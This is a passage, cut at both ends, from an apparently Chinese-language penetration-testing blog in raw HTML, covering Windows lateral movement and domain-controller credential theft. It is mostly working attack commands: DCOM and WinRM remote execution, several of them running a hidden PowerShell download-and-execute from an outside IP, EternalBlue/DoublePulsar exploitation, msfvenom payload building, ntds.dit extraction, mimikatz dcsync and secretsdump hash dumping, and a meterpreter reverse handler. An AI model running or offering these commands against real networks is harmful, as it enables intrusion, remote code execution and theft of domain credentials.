class=\"line\">Get-WmiObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>\n<p><strong>DCOM 横向前提</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、需要关闭系统防火墙</span><br><span class=\"line\">2、必须拥有管理员权限</span><br><span class=\"line\">3、在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户</span><br></pre></td></tr></table></figure>\n<p><strong>MMC20.Application 远程执行命令</strong></p>\n<p>1、通过 PowerShell 与 DCOM 进行远程交互，此外，我们只需要提供一个 DCOM ProgID 和一个 IP 地址，然后，它就从远程返回一个 COM 对象的实例。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0</span><br><span class=\"line\">.0.1&quot;))</span><br></pre></td></tr></table></figure>\n<p>2、然后执行如下命令，我们就可以调用 &quot;ExecuteShellCommand&quot; 方法在远程主机上启动进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c</span><br><span class=\"line\">calc.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>\n<p>3、将 IP 和命令换成上线的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.41.147&quot;))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;Mini</span><br><span class=\"line\">mzed&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>ShellWindows 远程执行命令</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-</span><br><span class=\"line\">00A0C90A8F39&#x27;,&quot;127.0.0.1&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;</span><br><span class=\"line\">/c calc.exe&quot;,&quot;c:windowssystem32&quot;,$null,0) 打开本地计算器</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-</span><br><span class=\"line\">00A0C90A8F39&#x27;,&quot;192.168.41.147&quot;)).item().Document.Application.ShellExecute(&quot;cmd.e</span><br><span class=\"line\">xe&quot;,&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;c:wi</span><br><span class=\"line\">ndowssystem32&quot;,$null,0)</span><br></pre></td></tr></table></figure>\n<p><strong>ShellBrowserWindow 远程执行命令</strong></p>\n<p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-</span><br><span class=\"line\">00A0C91F3880&quot;,&quot;192.168.41.147&quot;)).Document.Application.shellExecute(&quot;cmd.exe&quot;,&quot;/c</span><br><span class=\"line\">powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;c:wi</span><br><span class=\"line\">ndowssystem32&quot;,$null,0)</span><br></pre></td></tr></table></figure>\n<p><strong>调用 Excel.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 excle</p>\n<p>1、 通过 PowerShell 与 DCOM 进行远程交互，创建 Excel.Application 对象的实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.41.147&quot;))</span><br><span class=\"line\">$com.DisplayAlerts = $false</span><br><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;127.0</span><br><span class=\"line\">.0.1&quot;))</span><br></pre></td></tr></table></figure>\n<p>2、然后执行如下命令，我们就可以调用该对象的 &quot;DDEInitiate&quot; 方法在远程主机上启动进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;/c 参数&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Visio.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 Visio</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.52.138&quot;)).[0].Document.Application.shellExecute(&quot;C:shell.exe&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Outlook.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 Outlook</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192</span><br><span class=\"line\">.168.52.138&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;C:shell.exe&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>Impacket <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1kY29tZXhlYy1rZDBtajU0NGEucHk=\">中的 dcomexec.py</span></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dcomexec.exe [domain/]username:password@ip //创建一个交互式shell</span><br><span class=\"line\">dcomexec.exe [domain/]username:password@ip command // 执行命令</span><br><span class=\"line\">dcomexec.exe [domain/]username:@ip -hashes [hash] //hash传递</span><br></pre></td></tr></table></figure>\n<h3 id=\"winrm介绍\"><a class=\"markdownIt-Anchor\" href=\"#winrm介绍\">#</a> <strong>WinRM 介绍</strong></h3>\n<p>WinRM（Windows 远程管理）是 Microsoft 在 Windows 中对 WS-Management 的实现，它使系统可以跨通用网络访问或交换管理信息。利用脚本对象或内置的命令行工具，WinRM 可以与可能具有基板管理控制器（BMC）的任何远程计算机一起使用，以获取数据。也可以获取基于 Windows 的计算机（包括 WinRM）。 WinRM 默认端口 5985（HTTP 端口）或 5986（HTTPS 端口），若配置了 WINRM 远程服务，当我们拿到一个管理员账户时，可以使用远程连接进行命令执行操作</p>\n<p>winrm 通过 HTTP（5985）或 HTTPS SOAP（5986）端口来进行通信</p>\n<p><strong>winrs.exe</strong></p>\n<p>Winrs.exe 是一个内置的命令行工具，它允许远程命令的执行在 WinRm 的适当的有资格的用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:administrator -p:Admin@123 &quot;whoami&quot;</span><br><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx &quot;ipconfig&quot;</span><br><span class=\"line\">winrs -r:https://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx &quot;ipconfig&quot;</span><br><span class=\"line\">winrs -r:http://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx cmd</span><br><span class=\"line\">winrs -r:https://127.0.0.1:5985 -u:机器名\\用户名 -p:xxxxx cmd</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -ScriptBlock &#123; dir c:\\ &#125;</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -Credential 域名\\用户名 -command &#123;Get-Culture&#125;</span><br><span class=\"line\">Invoke-Command -ComputerName TARGET -Credential 域名\\用户名 -ScriptBlock &#123;Get-Culture&#125;</span><br></pre></td></tr></table></figure>\n<p>1、执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrs -r:http://192.168.41.147:5985 -u:administrator -p:Admin@123 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>\n<p>如果出现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Winrs error:WinRM 客户端无法处理该请求。 可以在下列条件下将默认身份验证与 IP 地址结合使用:</span><br><span class=\"line\">传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。 使用 winrm.cmd 配置</span><br><span class=\"line\">TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置</span><br><span class=\"line\">TrustedHosts 的详细信息，请运行以下命令</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>CS 使用自带 winrm 上线</strong></p>\n<p>必须使用域管账号</p>\n<h3 id=\"使用系统漏洞ms17010横向移动\"><a class=\"markdownIt-Anchor\" href=\"#使用系统漏洞ms17010横向移动\">#</a> <strong>使用系统漏洞 ms17010 横向移动</strong></h3>\n<p><strong>Cobalt Strike 生成 DLL</strong></p>\n<p>1、生成 CS 的生成 bin 文件</p>\n<p>2、使用 msf 用 bin 文件生成 dll 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x64 --platform windows -</span><br><span class=\"line\">f dll -o wanli111.dll</span><br></pre></td></tr></table></figure>\n<p><strong>原版 ms17-010 渗透</strong></p>\n<p>1、CS 执行下面的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Eternalblue-2.2.0.exe --TargetIp 192.168.41.168 --Target WIN72K8R2 --</span><br><span class=\"line\">DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --</span><br><span class=\"line\">VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig</span><br><span class=\"line\">outlog.txt</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp</span><br><span class=\"line\">192.168.41.168 --TargetPort 445 --Protocol SMB --Architecture x64 --Function</span><br><span class=\"line\">RunDLL --DllPayload 123.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --</span><br><span class=\"line\">ProcessCommandLine &quot;&quot; --NetworkTimeout 60</span><br></pre></td></tr></table></figure>\n<h2 id=\"域控安全\"><a class=\"markdownIt-Anchor\" href=\"#域控安全\">#</a> 域控安全</h2>\n<h3 id=\"ntdsdit\"><a class=\"markdownIt-Anchor\" href=\"#ntdsdit\">#</a> ntds.dit</h3>\n<p>ntds.dit 为 ad 的数据库，内容有域用户、域组、用户 hash 等信息，域控上的 ntds.dit 只有可以登录到域控的用户（如域管用户、DC 本地管理员用户）可以访问。ntds.dit 包括三个主要表：数据表、链接表、sd 表。所以只要在域渗透中能够获取到 ntds.dit 就可以获取到所有域用户的用户名和对应的 hash，它和 SAM 文件一样，被 windows 系统锁死</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\NTDS</span><br></pre></td></tr></table></figure>\n<h3 id=\"提取移动ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#提取移动ntdsdit文件\">#</a> 提取移动 ntds.dit 文件</h3>\n<p><strong>ntdsutils.exe 提取 ntds.dit</strong></p>\n<p>ntdsutils.exe 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutils.exe 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区等，该工具默认安装在域控服务器上，可以在域控制器上直接操作，支持 windows server 2003、2008、2012。提取过程分为 3 步：</p>\n<p>第一步：创建快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q</span><br></pre></td></tr></table></figure>\n<p>第二步：加载快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;mount &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; q q</span><br></pre></td></tr></table></figure>\n<p>第三步：复制快照中的 ntds.dit 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy &#x27;快照地址\\Windows\\NTDS\\ntds.dit&#x27; 目标地址</span><br></pre></td></tr></table></figure>\n<p>第四步：删除快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil.exe snapshot &quot;umount &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; &quot;delete &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; q q</span><br></pre></td></tr></table></figure>\n<p><strong>vssadmin 提取 ntds.dit</strong></p>\n<p>vssadmin1 是 Windows Server 2008 及 Windows 7 系统提供的 VSS 管理工具，它可以用于创建或删除卷影副本，列出卷影副本的信息（只能管理系统 Provider 创建的卷影副本）。还可以用于显示所有安装的所有卷影副本写入程序（writers）和提供程序（providers），以及改变卷影副本存储空间（即所谓的 “diffff 空间”）的大小等。支持的操作系统：Server 2008、Server 2012</p>\n<p>第一步：创建快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>\n<p>第二步：复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds\\ntds.dit</span><br></pre></td></tr></table></figure>\n<p>第三步：删除快照</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>\n<p><strong>vssown 提取 ntds.dit</strong></p>\n<p>vssown.vbs 和 vssadmin 类似，它是由 Tim Tomes 开发完成的，它可以创建和删除卷影副本，以及启动和停止卷影复制服务</p>\n<p>第一步：启动卷影复制服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure>\n<p>第二步：创建一个 C 盘的卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure>\n<p>第三步：列出当前卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure>\n<p>第四步：复制文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\windows\\NTDS\\ntds.dit C:\\Users\\Administrator\\Desktop\\ntds\\ntds.dit</span><br></pre></td></tr></table></figure>\n<p>第五步：删除卷影副本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript vssown.vbs /delete &#123;B267559B-57D8-4D59-B77F-890CF57BA448&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>IFM</strong></p>\n<p>可以通过创建一个 IFM 的方式获取 ntds.dit，在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p>\n<p>第一步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>\n<p>此时 ntds.dit 将被保存在 C:\\test\\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在</p>\n<p>C:\\test\\registry 文件夹下</p>\n<p>第二步：删除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rmdir /s/q C:\\test</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>通过 impacket 里的 <span class=\"exturl\" data-url=\"aHR0cDovL3NlY3JldHNkdW1wLnB5\">secretsdump.py</span> 脚本可以直接远程读取 ntds.dit 并导出哈希值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds</span><br></pre></td></tr></table></figure>\n<h3 id=\"离线方式读取ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#离线方式读取ntdsdit文件\">#</a> <strong>离线方式读取 ntds.dit 文件</strong></h3>\n<p>离线一般需要两步：</p>\n<p>1、将远端域控的 ntds.dit 下载到本地，</p>\n<p>2、然后利用再在本地进行。</p>\n<p>注意：因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p>\n<p>命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg save hklm\\system c:\\windows\\temp\\system.hive</span><br></pre></td></tr></table></figure>\n<p><strong>esedbexport</strong></p>\n<p>安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install autoconf automake autopoint libtool pkg-config</span><br><span class=\"line\">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb\u0002experimental-20210424.tar.gz</span><br><span class=\"line\">tar zxvf libesedb-experimental-20210424.tar.gz</span><br><span class=\"line\">cd libesedb-20210424</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br><span class=\"line\">ldconfig</span><br></pre></td></tr></table></figure>\n<p>2、导出 ntds.dit，两个重要的表为：datatable 以及 link_table，他们都会被存放在./ntds.dit.export/ 文件夹中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure>\n<p>3、安装 ntdsxtract</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/csababarta/ntdsxtract.git</span><br><span class=\"line\">cd ntdsxtract</span><br><span class=\"line\">python setup.py build</span><br><span class=\"line\">python setup.py install</span><br></pre></td></tr></table></figure>\n<p>如果提示 ImportError: No module named Crypto.Hash，请执行 pip install pycryptodome</p>\n<p>4、将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 1.txt 里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee 1.txt</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>将 ntds.dit.export 和 SYSTEM 文件放入到 和 secretsdump.exe 同级目录下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>\n<p><strong>NTDSDump.exe</strong></p>\n<p>NTDSDumpEx.exe 可以进行导出哈希值的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NTDSDumpEx -d ntds.dit -s system -o 1.txt</span><br></pre></td></tr></table></figure>\n<p><strong>DSInternals</strong></p>\n<p>DSInternals 是 powershell 脚本，可以离线读取 ntds 文件</p>\n<p>安装 DSInternals</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Install-Module DSInternals -Force</span><br></pre></td></tr></table></figure>\n<p>导出 hash，并保存在 txt 文件里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$key = Get-Bootkey -SystemHivePath &#x27;system路径&#x27; Get-ADDBAccount -All -DBPath &#x27;ntds路径&#x27; -Bootkey $key | Out-File output_hash.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"在线方式读取ntdsdit文件\"><a class=\"markdownIt-Anchor\" href=\"#在线方式读取ntdsdit文件\">#</a> <strong>在线方式读取 ntds.dit 文件</strong></h3>\n<p>在线的方式就是直接读取不需要在导出 ntds 文件，在域环境中，不要直接在线获取 hash，特别是域环境比较大的时候，在线获取 hash 等待时时间较长，工具占用资源太多，容易造成域控服务器崩溃</p>\n<p><strong>mimikatz</strong></p>\n<p>1、可以读取所有用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /domain:hack.com /all /csv</span><br></pre></td></tr></table></figure>\n<p>2、也可以读取单个用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /domain:hack.com /user:administrator</span><br></pre></td></tr></table></figure>\n<p><strong>Quarks PwDump</strong></p>\n<p>1、上传工具到目标机器，使用命令先导出 ntds 文件，然后直接读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell QuarksPwDump.exe --dump-hash-domain --ntds-file ntds,dit.</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-DCSync</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Invoke-DCSync.ps1</span><br><span class=\"line\">Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure>\n<p><strong>impacket</strong></p>\n<p>使用 secretsdump 直接读取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds</span><br></pre></td></tr></table></figure>\n<p><strong>MSF 读取 ntds.dit 文件</strong></p>\n<p>离线读取使用 msf 读取 ntds 文件，前提是 msf 必须和域控相同，我们可以使用代理技术，将 msf 代理到内网，然后使用 msf 导出 ntds 文件</p>\n<p>1、使用导出模块进行导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use auxiliary/admin/smb/psexec_ntdsgrab</span><br></pre></td></tr></table></figure>\n<p>2、填写相关的选项，主要有 IP, 域，用户名和密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set RHOSTS 192.168.41.10</span><br><span class=\"line\">set SMBDomain hack.com</span><br><span class=\"line\">set smbuser administrator</span><br><span class=\"line\">set smbpass &quot;123456kl;&#x27;/&quot;</span><br></pre></td></tr></table></figure>\n<p>3、运行之后 ntds 和 system 文件会被保存到 /root/.msf4/loot 下</p>\n<p>4、在相应的目录下找到该文件</p>\n<p>5、使用相应的工具读取该文件即可</p>\n<p><strong>在线读取</strong></p>\n<p>1、使用 cs 或者其他的方式先上线的 msf 中使用派生会话的方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_http</span><br><span class=\"line\">set lhost 本机ip</span><br><span class=\"line\">set lport 接受的端口</span><br><span class=\"line\">exploit 执行</span><br></pre></td></tr></table></figure>\n<p>2、拿到 shell 之后执行 hashdump，如果不能执行就迁移进程到 64 位中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">migrate 4812</span><br></pre></td></tr></table></figure>\n<p>3、或者使用下面的脚本，也可以读取域内的 hash</p>\n<figure class=\"highlight 